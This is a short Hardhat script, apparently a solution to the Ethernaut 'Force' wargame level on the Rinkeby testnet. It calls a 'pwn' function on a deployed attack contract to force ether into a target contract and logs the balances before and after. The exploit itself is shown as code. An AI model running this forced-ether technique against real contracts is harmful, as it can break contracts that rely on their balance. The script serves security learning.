import { ethers } from "hardhat"

const main = async () => {
  const targetAddress = "0xB5f4a2B93c83D3504405251B3897175142b117e7"
  const targetAbi: any[] = []

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Force")

  console.log(`Balance of target ${await contract.number()}`)

  const tx = await contract.pwn(targetAddress, {
    value: ethers.utils.parseEther("0.0000001"),
    gasLimit: 100000,
  })
  const receipt = await tx.wait()
  console.log(
    `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
  )

  console.log(
    `Balance of target ${await ethers.provider.getBalance(target.address)}`
  )

  console.log(`Balance of target ${await contract.number()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
